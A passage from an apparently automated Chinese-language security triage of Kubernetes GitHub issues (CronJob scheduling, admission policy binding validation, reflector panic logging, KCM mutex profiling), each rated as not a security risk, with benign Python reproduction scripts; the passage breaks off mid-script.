1.  **问题性质**：这本质上是一个调度逻辑的 bug。CronJob 控制器在处理 schedule 更新和 `lastScheduleTime` 状态时，可能存在边界情况处理不当，导致在 schedule 更改后的第一个周期内，仍然按照旧的 schedule 触发了一次 Job。
2.  **触发条件**：触发此问题需要用户具有修改 CronJob `spec.schedule` 和 `status.lastScheduleTime` 的权限。这通常意味着用户需要对 CronJob 对象拥有 `patch` 或 `update` 权限。
3.  **影响范围**：影响的是 CronJob 的执行时间点。Job 本身执行的内容、权限、资源访问等均未改变。它只是在用户预期之外的时间多执行了一次（或者说，没有按照预期跳过旧的时间点）。
4.  **安全风险评估**：
    *   **机密性 (Confidentiality)**：未涉及。Job 执行本身未改变，不会导致额外的数据泄露。
    *   **完整性 (Integrity)**：未涉及。Job 对系统的修改（如果 Job 本身有修改操作）是预期的，只是执行时间点意外。
    *   **可用性 (Availability)**：可能存在轻微的可用性影响。如果该 Job 是资源密集型或有副作用（例如发送通知、清理数据），在非预期时间执行可能导致短暂的资源竞争或不必要的干扰。但这更偏向于操作性问题而非典型的 DoS 攻击。根据标准 5，即使视为 DoS，利用它也需要 `patch` 权限，不应判断为高风险。
    *   **权限提升/命令执行**：未涉及。该 bug 不会授予 Job 或触发者额外的权限，也不会导致执行非预期的命令。
    *   **多租户影响**：一个用户触发此 bug 影响的是其自身有权限管理的 CronJob，不会直接影响其他租户的 CronJob（除非该 Job 本身设计为跨命名空间操作，但这与此 bug 无关）。

5.  **结论**：该 Issue 描述的是一个功能性缺陷（调度逻辑 bug），而不是一个安全漏洞。它不会导致权限提升、信息泄露、远程代码执行等典型安全风险。虽然可能引起操作上的意外，但不满足低风险或高风险安全问题的标准。用户需要具备修改 CronJob 的权限才能触发此行为，这是正常的操作权限。

**复现过程：**

```python
# 该 Issue 被判定为功能性缺陷而非安全风险，因此不提供复现脚本。
# 复现步骤已在 Issue 内容中通过 kubectl 命令清晰描述。
# 如果需要使用 Python Kubernetes 客户端复现该功能性问题，
# 可以参照 Issue 中的 kubectl 命令，使用 client.BatchV1Api() 的
# create_namespaced_cron_job, patch_namespaced_cron_job,
# patch_namespaced_cron_job_status 等方法实现。
# 但由于非安全风险，此处省略具体脚本。

pass
```


**解释说明：**

该 Issue 指出的问题是 Kubernetes CronJob 控制器在特定条件下（在两次计划执行时间之间修改 schedule）未能正确处理下一次执行时间，导致任务在旧的计划时间点意外运行了一次。这是一个功能层面的调度逻辑错误，而非安全漏洞。

攻击者无法利用此问题来提升权限、执行任意代码、泄露敏感信息或对系统造成严重破坏性的拒绝服务攻击。触发此行为需要具备修改 CronJob 资源的权限，这是 Kubernetes RBAC 控制下的预期操作。

由于该问题不构成安全风险（评级为“不涉及”），根据要求，无需提供用于复现安全漏洞的 Python POC 脚本。Issue 中提供的 `kubectl` 命令序列足以复现该功能性行为，供开发或测试人员验证和修复该调度 bug。

---


## Issue #130822 Applying ValidatingAdmissionPolicyBinding with paramRef fails with `spec.paramRef.parameterNotFoundAction: Required value`

- Issue 链接：[#130822](https://github.com/kubernetes/kubernetes/issues/130822)

### Issue 内容

#### What happened?

When trying to apply the Binding for a Validating Admission Policy referencing from a Custom Resource I get the following error (See manifests below):
`The ValidatingAdmissionPolicyBinding "test-policy-binding" is invalid: spec.paramRef.parameterNotFoundAction: Required value`

Applying the same binding without `paramRef` works as expected.

Manifests were created based on https://kubernetes.io/docs/reference/access-authn-authz/validating-admission-policy/ and stripped down in the example manifests below to allow for minimal reproducibility.

#### What did you expect to happen?

VAP-Binding should have been applied successfully.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Create k8s cluster
2. Apply Manifests
    1. CRD
        <details>

        ```yaml
        apiVersion: apiextensions.k8s.io/v1
        kind: CustomResourceDefinition
        metadata:
          name: testparams.test.param
        spec:
          group: test.param
          versions:
            - name: v1
              served: true
              storage: true
              schema:
                openAPIV3Schema:
                  type: object
                  properties:
                    test:
                      type: string
          scope: Cluster
          names:
            plural: testparams
            singular: testparam
            kind: TestParam
        ```

        </details>
    2. Policy
        <details>

        ```yaml
        apiVersion: admissionregistration.k8s.io/v1
        kind: ValidatingAdmissionPolicy
        metadata:
          name: test-policy
        spec:
          failurePolicy: Fail
          matchConstraints:
            resourceRules:
            - apiGroups:
              - ""
              apiVersions:
              - v1
              operations:
              - CREATE
              - UPDATE
              resources:
              - pods
          paramKind:
            apiVersion: test.param/v1
            kind: TestParam
          validations:
          - expression: 'params.test == "test-value"'
            message: Success
        ```

        </details>
    3. Config
        <details>

        ```yaml
        apiVersion: test.param/v1
        kind: TestParam
        metadata:
          name: test-config
        test: test-value
        ```

        </details>
    4. Binding
        <details>

        ```yaml
        apiVersion: admissionregistration.k8s.io/v1
        kind: ValidatingAdmissionPolicyBinding
        metadata:
          name: test-policy-binding
        spec:
          policyName: test-policy
          paramRef:
            name: test-config
          validationActions:
          - Warn
        ```

        </details>
3. Applying the binding fails with `The ValidatingAdmissionPolicyBinding "test-policy-binding" is invalid: spec.paramRef.parameterNotFoundAction: Required value`

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
# k3d/k3s
$ kubectl version
Client Version: v1.32.2
Kustomize Version: v5.5.0
Server Version: v1.31.5+k3s1
# minikube
$ kubectl version
Client Version: v1.32.2
Kustomize Version: v5.5.0
Server Version: v1.32.0
```
Tested with k3d/k3s and minikube Cluster

</details>


#### Cloud provider

-/-


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="AlmaLinux"
VERSION="9.5 (Teal Serval)"
ID="almalinux"
ID_LIKE="rhel centos fedora"
VERSION_ID="9.5"
PLATFORM_ID="platform:el9"
PRETTY_NAME="AlmaLinux 9.5 (Teal Serval)"
ANSI_COLOR="0;34"
LOGO="fedora-logo-icon"
CPE_NAME="cpe:/o:almalinux:almalinux:9::baseos"
HOME_URL="https://almalinux.org/"
DOCUMENTATION_URL="https://wiki.almalinux.org/"
BUG_REPORT_URL="https://bugs.almalinux.org/"

ALMALINUX_MANTISBT_PROJECT="AlmaLinux-9"
ALMALINUX_MANTISBT_PROJECT_VERSION="9.5"
REDHAT_SUPPORT_PRODUCT="AlmaLinux"
REDHAT_SUPPORT_PRODUCT_VERSION="9.5"
SUPPORT_END=2032-06-01
$ uname -a
Linux redacted.hostname 5.14.0-503.26.1.el9_5.x86_64 #1 SMP PREEMPT_DYNAMIC Mon Mar 3 05:56:39 EST 2025 x86_64 x86_64 x86_64 GNU/Linux
```

</details>

#### Install tools

- k3d/k3s
- minikube


#### Container runtime (CRI) and version (if applicable)

k3d/k3s: `containerd://1.7.23-k3s2`
minikube: `containerd://1.7.24`


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

-/-


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
1.  **Issue描述**: 该Issue报告了在Kubernetes集群中应用一个`ValidatingAdmissionPolicyBinding`资源时遇到的问题。当该Binding使用了`spec.paramRef`字段来引用一个自定义资源（CR）作为参数时，API服务器拒绝了该操作，并返回错误 `spec.paramRef.parameterNotFoundAction: Required value`。如果移除`paramRef`字段，Binding可以成功应用。
2.  **问题性质**: 这个错误表明，根据Kubernetes API服务器的验证规则，当`spec.paramRef`字段被指定时，其内部的`parameterNotFoundAction`字段是必需的。用户提供的`ValidatingAdmissionPolicyBinding`清单中缺少了这个必需的字段，因此API服务器拒绝了该清单，认为其格式无效。
3.  **安全风险评估**:
    *   该问题是由于用户提供的资源清单不符合API规范（缺少必需字段）而导致的配置错误。Kubernetes API服务器正确地执行了验证，并拒绝了无效的配置。
    *   这并没有暴露新的攻击面，没有导致信息泄露（除了标准的API错误信息）、权限提升、命令执行或拒绝服务（DoS）。API服务器拒绝无效配置是预期行为，是系统健壮性的体现。
    *   用户未能成功应用一个准入策略（Binding），但这本身不是安全漏洞，而是配置未能生效。攻击者无法利用这个错误来绕过安全策略或获得未授权的访问。
    *   根据风险判断标准，这是一个配置问题或潜在的API使用文档/示例问题，而不是软件本身的安全漏洞。用户提交的错误配置不属于项目本身的安全风险（标准4）。

4.  **结论**: 该Issue描述的问题是API使用层面的配置验证错误，并非Kubernetes本身的安全漏洞。

**复现过程：**

```python
import yaml
import time
import logging
import sys
from kubernetes import config, client
from kubernetes.client.rest import ApiException
import datetime

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Define resource manifests from the issue
CRD_MANIFEST = """
apiVersion: apiextensions.k8s.io/v1
kind: CustomResourceDefinition
metadata:
  name: testparams.test.param
spec:
  group: test.param
  versions:
    - name: v1
      served: true
      storage: true
      schema:
        openAPIV3Schema:
          type: object
          properties:
            test:
              type: string
  scope: Cluster
  names:
    plural: testparams
    singular: testparam
    kind: TestParam
"""

POLICY_MANIFEST = """
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicy
metadata:
  name: test-policy
spec:
  failurePolicy: Fail
  matchConstraints:
    resourceRules:
    - apiGroups:
      - ""
      apiVersions:
      - v1
      operations:
      - CREATE
      - UPDATE
      resources:
      - pods
  paramKind:
    apiVersion: test.param/v1
    kind: TestParam
  validations:
  - expression: 'params.test == "test-value"'
    message: Success
"""

CONFIG_MANIFEST = """
apiVersion: test.param/v1
kind: TestParam
metadata:
  name: test-config
test: test-value
"""

# This binding is intentionally missing 'parameterNotFoundAction' to reproduce the error
BINDING_MANIFEST_INVALID = """
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicyBinding
metadata:
  name: test-policy-binding
spec:
  policyName: test-policy
  paramRef:
    name: test-config
    # parameterNotFoundAction: Deny # This line is missing, causing the error
  validationActions:
  - Warn
"""

# Corrected binding for cleanup/reference
BINDING_MANIFEST_VALID = """
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicyBinding
metadata:
  name: test-policy-binding
spec:
  policyName: test-policy
  paramRef:
    name: test-config
    parameterNotFoundAction: Deny # Added the required field
  validationActions:
  - Warn
"""

# Resource details for easier management
RESOURCES = [
    {"kind": "CustomResourceDefinition", "name": "testparams.test.param", "manifest": CRD_MANIFEST, "api": "ApiextensionsV1Api", "method_create": "create_custom_resource_definition", "method_delete": "delete_custom_resource_definition"},
    {"kind": "ValidatingAdmissionPolicy", "name": "test-policy", "manifest": POLICY_MANIFEST, "api": "AdmissionregistrationV1Api", "method_create": "create_validating_admission_policy", "method_delete": "delete_validating_admission_policy"},
    {"kind": "TestParam", "name": "test-config", "manifest": CONFIG_MANIFEST, "api": "CustomObjectsApi", "method_create": "create_cluster_custom_object", "method_delete": "delete_cluster_custom_object", "group": "test.param", "version": "v1", "plural": "testparams"},
    {"kind": "ValidatingAdmissionPolicyBinding", "name": "test-policy-binding", "manifest": BINDING_MANIFEST_INVALID, "api": "AdmissionregistrationV1Api", "method_create": "create_validating_admission_policy_binding", "method_delete": "delete_validating_admission_policy_binding"},
]

def cleanup_resource(api_client, resource_details):
    """Attempts to delete a Kubernetes resource."""
    api_instance = getattr(client, resource_details["api"])(api_client)
    delete_method = getattr(api_instance, resource_details["method_delete"])
    name = resource_details["name"]
    kind = resource_details["kind"]

    try:
        if kind == "TestParam":
            delete_method(
                group=resource_details["group"],
                version=resource_details["version"],
                plural=resource_details["plural"],
                name=name,
                body=client.V1DeleteOptions(grace_period_seconds=0)
            )
        elif kind == "CustomResourceDefinition":
             delete_method(name=name, body=client.V1DeleteOptions(grace_period_seconds=0))
        else:
            delete_method(name=name, body=client.V1DeleteOptions(grace_period_seconds=0))
        logging.info(f"Successfully initiated deletion of {kind} '{name}'.")
        # Wait briefly for deletion, especially for CRDs
        if kind == "CustomResourceDefinition":
             time.sleep(5) # Give CRD deletion a bit more time
        else:
             time.sleep(1)

    except ApiException as e:
        if e.status == 404:
            logging.info(f"{kind} '{name}' not found, assumed already deleted.")
        else:
            logging.error(f"Error deleting {kind} '{name}': {e.reason} ({e.status})")
    except Exception as e:
        logging.error(f"An unexpected error occurred during deletion of {kind} '{name}': {e}")


def main():
    """Main function to reproduce the issue."""
    start_time = datetime.datetime.now()
    timeout_seconds = 120  # 2 minutes timeout

    try:
        # Load Kubernetes configuration from default location
        config.load_kube_config()
        api_client = client.ApiClient()
        logging.info("Kubernetes configuration loaded.")
    except Exception as e:
        logging.error(f"Failed to load Kubernetes configuration: {e}")
        sys.exit(1)

    created_resources = [] # Keep track of successfully created resources for cleanup

    try:
        # Create resources one by one
        for resource_details in RESOURCES:
            # Check timeout
            if (datetime.datetime.now() - start_time).total_seconds() > timeout_seconds:
                logging.error("Script timed out.")
                break

            api_instance = getattr(client, resource_details["api"])(api_client)
            create_method = getattr(api_instance, resource_details["method_create"])
            body = yaml.safe_load(resource_details["manifest"])
            name = resource_details["name"]
            kind = resource_details["kind"]

            logging.info(f"Attempting to create {kind} '{name}'...")

            if kind == "ValidatingAdmissionPolicyBinding": # This is the one expected to fail
                try:
                    create_method(body=body)
                    # If it succeeds unexpectedly, log it and add to cleanup
                    logging.warning(f"Unexpected success: {kind} '{name}' created without error.")
                    created_resources.append(resource_details)
                except ApiException as e:
                    if e.status == 422 and "spec.paramRef.parameterNotFoundAction: Required value" in str(e.body):
                        logging.info(f"Successfully reproduced the expected error: Failed to create {kind} '{name}' due to missing 'parameterNotFoundAction'. Error details: {e.reason} ({e.status})")
                        logging.info("Validation Error Body (partial): " + str(e.body)[:200] + "...")
                        print("\nISSUE REPRODUCED SUCCESSFULLY")
                        # Do not add the failed resource to created_resources
                        # Stop processing further resources as the target state (error) is reached
                        break
                    else:
                        # Different error than expected
                        logging.error(f"Failed to create {kind} '{name}' with an unexpected error: {e.reason} ({e.status})")
                        logging.error("Error Body: " + str(e.body))
                        # Still add previous resources for cleanup, but stop processing
                        break
                except Exception as e:
                     logging.error(f"An unexpected non-API exception occurred while creating {kind} '{name}': {e}")
                     break

            else: # Handle creation for other resources normally
                try:
                    if kind == "TestParam":
                        create_method(
                            group=resource_details["group"],
                            version=resource_details["version"],
                            plural=resource_details["plural"],
                            body=body
                        )
                    else:
                        create_method(body=body)

                    logging.info(f"Successfully created {kind} '{name}'.")
                    created_resources.append(resource_details)

                    # Add a small delay, especially after CRD creation
                    if kind == "CustomResourceDefinition":
                        logging.info("Waiting a few seconds for CRD to be established...")
                        time.sleep(5) # Wait for CRD to become available
                    elif kind == "ValidatingAdmissionPolicy":
                        time.sleep(1) # Small delay after policy creation
                    elif kind == "TestParam":
                         time.sleep(1) # Small delay after CR creation


                except ApiException as e:
                    if e.status == 409: # Conflict - Resource already exists
                        logging.warning(f"{kind} '{name}' already exists. Assuming it's usable.")
                        # Add to created_resources for cleanup even if it existed before
                        created_resources.append(resource_details)
                    else:
                        logging.error(f"Failed to create {kind} '{name}': {e.reason} ({e.status})")
                        logging.error("Error Body: " + str(e.body))
                        # Stop processing if a prerequisite fails
                        break
                except Exception as e:
                    logging.error(f"An unexpected non-API exception occurred while creating {kind} '{name}': {e}")
                    break

        # Check timeout after loop
        if (datetime.datetime.now() - start_time).total_seconds() > timeout_seconds:
             logging.error("Script timed out during resource creation.")

    finally:
        # Cleanup phase
        logging.info("\n--- Starting Cleanup Phase ---")
        # Iterate in reverse order of creation
        for resource_details in reversed(created_resources):
             # Check timeout during cleanup
             if (datetime.datetime.now() - start_time).total_seconds() > timeout_seconds:
                 logging.warning("Timeout reached during cleanup. Some resources might remain.")
                 break
             cleanup_resource(api_client, resource_details)

        # Ensure the potentially failed binding is also cleaned up if it somehow got created
        # or if the test needs to run again (by checking if it exists)
        binding_details = next((r for r in RESOURCES if r["kind"] == "ValidatingAdmissionPolicyBinding"), None)
        if binding_details:
             cleanup_resource(api_client, binding_details)


        logging.info("--- Cleanup Phase Finished ---")

# Execute the main function directly
main()
```


**解释说明：**

1.  **目的**: 该脚本旨在通过编程方式复现Issue中描述的问题，即尝试在Kubernetes集群中创建一个缺少`spec.paramRef.parameterNotFoundAction`字段的`ValidatingAdmissionPolicyBinding`资源，并验证是否收到了预期的API验证错误。
2.  **库依赖**: 脚本使用了`kubernetes` Python客户端库来与Kubernetes API进行交互，`yaml`库来解析清单字符串，以及`logging`, `time`, `sys`, `datetime`进行日志记录、暂停、系统退出和超时控制。
3.  **资源定义**: 脚本内以字符串形式定义了Issue中提供的所有四个Kubernetes资源清单（CRD, Policy, Config CR, Binding）。注意，`BINDING_MANIFEST_INVALID`故意省略了`parameterNotFoundAction`字段以触发错误。
4.  **执行流程**:
    *   加载本地`kubeconfig`文件以连接到Kubernetes集群。
    *   按顺序创建CRD, `ValidatingAdmissionPolicy`, 和 `TestParam` 自定义资源。脚本包含错误处理，例如处理资源已存在（409 Conflict）的情况，并在创建CRD后稍作等待，确保其被API服务器识别。
    *   关键步骤是尝试创建无效的`ValidatingAdmissionPolicyBinding`。这部分代码被包裹在`try...except ApiException`块中。
    *   **错误验证**: 如果捕获到`ApiException`，脚本会检查异常的状态码是否为`422`（Unprocessable Entity，通常表示验证错误）以及错误体（`e.body`）中是否包含关键错误信息 `"spec.paramRef.parameterNotFoundAction: Required value"`。
    *   如果预期的错误被捕获，脚本会打印成功复现的消息并停止后续资源的创建。
    *   如果创建意外成功或发生其他错误，脚本会记录相应的警告或错误信息。
5.  **清理**: 使用`finally`块确保无论脚本执行成功与否，都会尝试删除所有创建的资源（按创建顺序的反向进行清理），以保持集群状态整洁。清理函数也处理了资源不存在（404 Not Found）的异常。
6.  **超时**: 脚本包含一个简单的超时机制（2分钟），以防止在意外情况下（如网络问题或集群响应缓慢）无限期挂起。
7.  **运行**: 直接执行该Python脚本即可。它会连接到`kubeconfig`配置的当前Kubernetes上下文，并执行上述步骤。成功复现问题时，会输出明确的成功信息。

该脚本验证了Issue报告的现象——API服务器确实要求在`paramRef`中提供`parameterNotFoundAction`字段，缺少该字段会导致资源创建失败。这确认了Issue描述的行为，但如分析所述，这并非安全漏洞。

---


## Issue #130817 Reflector panic doesn't provide any debug information

- Issue 链接：[#130817](https://github.com/kubernetes/kubernetes/issues/130817)

### Issue 内容

#### What happened?

If code panics with nil pointer exception under reflector it will not provide any information about source of panic.

https://github.com/kubernetes/kubernetes/blob/e7eb076349dbb1343c71da8d31ea208457e6684d/staging/src/k8s.io/client-go/tools/cache/reflector.go#L627-L628

#### What did you expect to happen?

Panic should provide accurate stacktrace information about the source of panic

#### How can we reproduce it (as minimally and precisely as possible)?

Inject a panic reflector code

#### Anything else we need to know?

_No response_

#### Kubernetes version

Any

#### Cloud provider

Nvm

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue主要反映了Kubernetes `client-go`库中的`Reflector`组件在发生空指针异常（nil pointer exception）导致panic时，没有提供足够详细的堆栈跟踪信息（stacktrace），使得开发者难以定位panic的根源。

具体分析如下：
1.  **问题性质**：该问题核心是关于错误处理和可调试性（debuggability）。当程序发生内部错误（此处特指空指针解引用）并崩溃时，缺乏详细的错误来源信息，这会增加问题排查和修复的难度。
2.  **安全影响**：
    *   **信息泄露**：Issue本身并未描述任何敏感信息泄露。它关注的是*缺失*信息（堆栈跟踪）。
    *   **拒绝服务 (DoS)**：虽然panic本身会导致使用该Reflector的组件（如Controller）崩溃，从而可能引发DoS，但Issue的核心关注点并非如何触发panic，而是panic发生后的日志输出问题。要触发这个panic，很可能需要特定的API对象状态或交互，这可能需要攻击者具有一定的权限（例如创建、修改可能导致问题的资源）。根据风险判断标准第5条，需要权限才能触发的DoS通常不判定为高风险。此外，该Issue并没有提供触发panic的具体方法，仅提到“注入一个panic reflector代码”，这更像是开发者调试或测试场景。
    *   **权限提升/命令执行等**：从Issue描述来看，完全不涉及此类高危风险。panic通常导致进程终止，而非代码执行或权限提升。
    *   **多用户影响**：Reflector通常由控制平面组件或Operator使用。一个组件的panic可能会影响其负责管理的资源或功能，但一般不会直接跨越权限边界影响到不相关的其他用户或租户的运行环境（除非是共享的核心组件panic，但这仍属于DoS范畴）。根据风险判断标准第8条，没有迹象表明低权限用户能通过此影响其他用户。
3.  **问题根源**：问题在于代码库`client-go`中`Reflector`的错误处理逻辑（具体指向了`recover()`后的处理部分），它捕获了panic但没有有效地记录或重新panic以保留原始堆栈信息。
4.  **结论**：该Issue描述的是一个软件健壮性/可维护性问题，而非一个可以直接利用的安全漏洞。虽然底层的panic可能构成DoS风险，但Issue本身关注的是诊断信息的缺失。根据风险判断标准第2条，该问题应判定为非安全问题。即使考虑潜在的DoS，也因可能需要权限（标准5）而不判定为高风险。

**复现过程：**

```python
# 该 Issue 描述的问题是关于 panic 发生时缺乏调试信息，这是一个日志记录和错误处理的问题，
# 而不是一个可以通过外部交互直接利用的安全漏洞。
# 触发空指针 panic 本身可能需要特定的 Kubernetes 资源状态或交互，
# 这通常依赖于具体的 Controller/Operator 实现以及集群状态，难以编写通用的 POC。
# 此外，该 Issue 的核心并非如何触发 panic，而是 panic 发生后的日志输出问题。
# 因此，无法也无需编写针对此 Issue 描述问题的、具有安全意义的复现 POC。
#
# 以下仅为示意代码，说明如何使用 client-go (概念上，非实际运行)
# 并非复现 Issue 中描述的 "缺乏调试信息" 的问题本身。

# import kubernetes
#
# # 假设配置在默认位置 ~/.kube/config
# try:
#     kubernetes.config.load_kube_config()
# except kubernetes.config.ConfigException as e:
#     print(f"无法加载 kubeconfig: {e}")
#     print("请确保 kubeconfig 文件存在于默认位置或配置正确。")
#     exit(1)
#
# v1 = kubernetes.client.CoreV1Api()
#
# # 概念性代码：如果 client-go 的 Reflector 内部存在一个未处理的空指针风险，
# # 并且某个 Watch 操作触发了该风险，则相关进程会 panic。
# # 这个 POC 无法模拟 client-go 内部的空指针异常及其错误处理逻辑。
#
# print("该 Issue 描述的是 panic 后的调试信息不足问题，无法通过外部 POC 复现。")
# print("此脚本仅作占位符，不执行任何操作。")

def main():
    print("该 Issue 指出的问题是 Go 代码库内部 panic 时日志信息不足，属于代码可维护性问题，而非安全漏洞。")
    print("无法编写 Python POC 来复现 Go 代码库内部的 panic 处理逻辑问题。")
    print("风险评级为 '不涉及'，无需 POC。")

main()
```


**解释说明：**

该Issue的核心问题是`client-go`库中`Reflector`组件在内部发生panic（特别是空指针异常）时，其`recover`逻辑没有有效地保留和报告原始的堆栈跟踪信息，导致开发者难以调试和定位问题的根本原因。这本质上是一个软件工程中的可调试性（debuggability）和错误报告（error reporting）问题。

由于以下原因，此问题被评级为“不涉及”安全风险：
1.  **非安全漏洞**：问题本身（缺乏调试信息）并不构成一个可以被攻击者利用来破坏系统安全性的漏洞。它不涉及未授权访问、数据泄露、权限提升或远程代码执行等。
2.  **关注点差异**：Issue关注的是panic发生*后*的信息记录，而不是如何*触发*panic。虽然触发panic可能导致拒绝服务（DoS），但这并非此Issue报告的重点。
3.  **潜在DoS的定性**：即使考虑潜在的DoS，根据标准5，如果触发需要非只读权限（例如，通过创建或修改特定资源来诱发Reflector处理逻辑中的nil指针错误），则不应判定为高风险。此Issue未提供足够信息表明可以在无权限或低权限下触发panic。

因此，无需编写复现POC。提供的Python脚本仅作为占位符，并解释了为什么无法且无需为这个问题编写POC，因为它描述的是Go代码库内部的错误处理行为，而不是一个可以通过外部Python脚本触发和利用的安全缺陷。脚本本身不执行任何与Kubernetes交互的操作，仅打印说明信息。

---


## Issue #130802 Mutex profiling is not configured properly in KCM

- Issue 链接：[#130802](https://github.com/kubernetes/kubernetes/issues/130802)

### Issue 内容

#### What happened?

Mutex profiling as part of the contention profiling in kube-controller-manager is not working because a prerequite method is not invoked.

#### What did you expect to happen?


We should invoke `SetMutexProfileFraction` before the mutex profiling can be served.
 https://github.com/kubernetes/kubernetes/blob/2261137135631d24248e94dff3bc6375ad9308b2/staging/src/k8s.io/controller-manager/app/serve.go#L63-L65

#### How can we reproduce it (as minimally and precisely as possible)?

Turn on `--profiling=true` and `--contention-profiling=true` in KCM and query `/debug/pprof/mutex` of KCM.

#### Anything else we need to know?

_No response_

#### Kubernetes version

HEAD of master


#### Cloud provider

N/A


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
1.  **Issue本质**: 该Issue描述的是Kubernetes的kube-controller-manager (KCM) 组件中的一个功能性缺陷。具体来说，互斥锁分析（Mutex profiling）作为竞争分析（contention profiling）的一部分，由于缺少对`SetMutexProfileFraction`方法的调用而无法正常工作。
2.  **问题影响**: 这个缺陷导致开发者或管理员无法使用`/debug/pprof/mutex`端点来获取预期的互斥锁竞争信息，影响了对KCM性能瓶颈进行诊断和调试的能力。
3.  **安全风险评估**:
    *   该问题本身是一个**功能缺失**的Bug，而不是一个引入了新的攻击面或暴露敏感信息的漏洞。pprof端点（包括`/debug/pprof/mutex`）用于性能分析和调试，访问这些端点通常需要管理员权限或通过安全的端口进行访问控制。
    *   启用profiling (`--profiling=true`) 本身可能带来一定的安全风险（如信息泄露、潜在的DoS），但这需要用户显式开启，并且访问通常受限。此Issue描述的问题是profiling的*某个功能不工作*，它并没有**增加**启用profiling所带来的固有风险，反而使得一部分（mutex）信息无法被获取。
    *   该问题不涉及远程代码执行、权限提升、拒绝服务（DoS）、信息泄露（除了profiling本身可能提供的信息外）、容器逃逸等典型安全漏洞。
    *   根据风险判断标准第2条，该问题非安全问题。
    *   根据风险判断标准第4条，即使开启profiling被认为是不当配置，那也是用户操作的问题，而非此Issue描述的bug本身引入的风险。

结论：该Issue描述的是一个功能性Bug，不涉及安全风险。

**复现过程：**

```python
import kubernetes
import requests
import urllib3
import logging
import time
from urllib.parse import urlparse

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Suppress InsecureRequestWarning for self-signed certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Constants
NAMESPACE = "kube-system"
LABEL_SELECTOR = "component=kube-controller-manager"
# Common ports for KCM health/metrics/profiling. 10257 is the default secure port.
# pprof might be exposed here under /debug/pprof/ or potentially on a different insecure port if configured.
# We'll try the standard secure port first.
KCM_SECURE_PORT = 10257
PPROF_MUTEX_PATH = "/debug/pprof/mutex"
REQUEST_TIMEOUT = 120 # seconds
MAX_RETRIES = 3
RETRY_DELAY = 5 # seconds

def find_kcm_pod_ip():
    """Finds the IP address of a running kube-controller-manager pod."""
    try:
        # Load default kubeconfig
        kubernetes.config.load_kube_config()
        core_v1_api = kubernetes.client.CoreV1Api()

        logging.info(f"Searching for KCM pods in namespace '{NAMESPACE}' with label '{LABEL_SELECTOR}'...")
        pods = core_v1_api.list_namespaced_pod(namespace=NAMESPACE, label_selector=LABEL_SELECTOR)

        if not pods.items:
            logging.error(f"No KCM pods found in namespace '{NAMESPACE}' with label '{LABEL_SELECTOR}'.")
            return None

        # Find a running pod
        for pod in pods.items:
            if pod.status.phase == "Running" and pod.status.pod_ip:
                logging.info(f"Found running KCM pod: {pod.metadata.name} with IP: {pod.status.pod_ip}")
                return pod.status.pod_ip
        
        logging.error(f"No running KCM pods with an assigned IP found.")
        return None

    except kubernetes.config.ConfigException as e:
        logging.error(f"Failed to load Kubernetes configuration: {e}. Ensure kubeconfig is set up correctly.")
        return None
    except kubernetes.client.ApiException as e:
        logging.error(f"Kubernetes API error: {e}")
        return None
    except Exception as e:
        logging.error(f"An unexpected error occurred while finding KCM pod: {e}")
        return None

def check_mutex_profiling(pod_ip):
    """Attempts to query the KCM mutex profiling endpoint."""
    if not pod_ip:
        return

    # Construct the URL using the secure port
    url = f"https://{pod_ip}:{KCM_SECURE_PORT}{PPROF_MUTEX_PATH}"
    logging.info(f"Attempting to query mutex profiling endpoint: {url}")

    session = requests.Session()
    # Need to handle authentication/authorization if RBAC restricts access to the secure port's endpoints.
    # For simplicity, we assume direct access or that the default service account token might work if mounted.
    # Often, pprof requires specific permissions or port-forwarding for external access.
    # We also disable SSL verification for typical self-signed certs in clusters.
    
    retries = 0
    while retries < MAX_RETRIES:
        try:
            response = session.get(url, verify=False, timeout=REQUEST_TIMEOUT)
            logging.info(f"Request to {url} returned status code: {response.status_code}")

            # Check the response based on the issue description
            if response.status_code == 200:
                # The issue states the profiling is not working *properly*.
                # This means the endpoint might exist (HTTP 200) but return
                # non-useful data, like "profiling disabled" or just basic stats
                # without actual mutex contention details.
                # A simple check could be the content length or specific keywords.
                content = response.text
                logging.info("Successfully queried the endpoint. Analyzing content...")
                logging.debug(f"Response content (first 500 chars):\n{content[:500]}\n...")
                
                # Heuristic: If profiling was truly enabled and working, we'd expect non-trivial content.
                # If SetMutexProfileFraction was not called, the output might be minimal or indicate disabled state.
                # This check is heuristic and depends on Go's pprof output format.
                if len(content) < 200 and "mutex profile" in content.lower(): # Example heuristic
                     logging.warning("Received response, but content seems minimal. This *might* indicate mutex profiling is not properly enabled as per the issue description.")
                elif "cycles/second=" in content or "contention" in content: # Check for actual data markers
                     logging.info("Response seems to contain mutex profiling data. The issue might be resolved or specific to certain configurations/versions.")
                else:
                     logging.warning("Received response, but it doesn't clearly indicate active mutex profiling. This might align with the issue description.")

            elif response.status_code == 401 or response.status_code == 403:
                 logging.error(f"Authentication/Authorization error ({response.status_code}). Access to {url} is forbidden. Ensure necessary permissions or use port-forwarding.")
            elif response.status_code == 404:
